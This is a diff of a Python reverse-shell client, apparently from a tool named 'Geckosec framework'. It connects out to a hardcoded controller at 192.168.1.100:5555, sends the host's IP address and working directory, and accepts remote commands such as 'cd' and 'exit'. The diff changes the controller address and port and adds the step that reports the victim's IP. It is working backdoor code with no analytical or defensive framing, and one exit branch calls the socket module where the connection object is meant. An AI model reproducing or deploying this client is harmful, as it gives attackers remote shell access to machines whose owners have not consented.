@@ -5,9 +5,6 @@
 # Start of project : 25/11/2020
 # Actual version : 1.1
 
-# Futures features :
-# Ajouter la reconnexion automatique (toutes les secondes tenté une reconnexion avec une fonction)
-
 import socket
 import subprocess
 import os
@@ -17,14 +14,18 @@ def main():
 
     global sock
 
-    host, port = ('192.168.43.90', 1234)
+    host, port = ('192.168.1.100', 5555)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
         sock.connect((host, port))
-        print(" /!\ Client connecté /!\ \n")
 
-        # On envoie le path
+        client_ip = socket.gethostbyname(socket.gethostname()).encode("utf8")
+        sock.send(client_ip)
+
+        print(" |$| Client connecté \n")
+
+        # On envoie le path dès le début (avant interraction)
         path = os.getcwd().encode("utf8")
         sock.send(path)
 
@@ -33,7 +34,7 @@ def main():
             command = command.decode("utf8")
 
             if command == "exit":
-                print("Merci d'avoir utilisé Geckosec framework !")
+                print("Merci d'avoir utilisé Geckosec Framework !")
 
                 result = "exit"
                 socket.send(result.encode())
@@ -42,6 +43,7 @@ def main():
                 sock.close()
 
             if command[:2] == "cd":
+                print("> " + command)
                 try :
                     new_dir = os.open( command[3:].strip() , os.O_RDONLY )
                     os.chdir(new_dir)
